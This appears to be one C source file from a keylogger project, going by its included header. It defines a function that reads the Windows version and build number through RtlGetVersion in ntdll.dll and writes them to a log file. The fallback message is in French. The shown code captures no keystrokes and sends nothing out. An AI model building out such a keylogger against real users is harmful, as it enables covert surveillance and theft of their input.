#include "keylogger.h"

void get_windows_info(void)
{
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (hMod)
	{
		void* pFn = (void*)GetProcAddress(hMod, "RtlGetVersion");
		if (pFn)
		{
			RtlGetVersionPtr fn = (RtlGetVersionPtr)pFn;
			RTL_OSVERSIONINFOW rovi;
			ZeroMemory(&rovi, sizeof(rovi));
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (fn(&rovi) == 0)
			{
				char versionInfo[256];
				snprintf(versionInfo, sizeof(versionInfo),
						 "Windows version: %ld.%ld (build %ld)\n",
						 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
				write_to_file(versionInfo);
				return;
			}
		}
	}
	write_to_file("Impossible de récupérer la version\n");
}
